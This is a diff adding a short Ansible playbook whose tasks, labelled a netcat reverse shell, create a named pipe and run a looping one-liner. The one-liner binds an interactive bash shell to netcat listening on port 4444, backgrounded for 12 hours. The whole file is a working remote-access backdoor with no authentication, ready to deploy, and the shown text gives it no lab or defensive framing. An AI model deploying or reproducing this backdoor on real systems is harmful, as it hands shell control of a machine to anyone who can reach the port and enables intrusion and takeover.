@@ -1,0 +1,13 @@
+---
+
+#Start netcat
+#Set async to 43200 seconds = 12 hours
+# Therefore netcat will keep listenting for 12 hours
+
+ - name: prep for netcat reverse shell
+   command: rm -f /tmp/f; mkfifo /tmp/f;
+   
+ - name: Start netcat apt
+   shell: while true; do cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f; done &
+   async: 43200
+   poll: 0
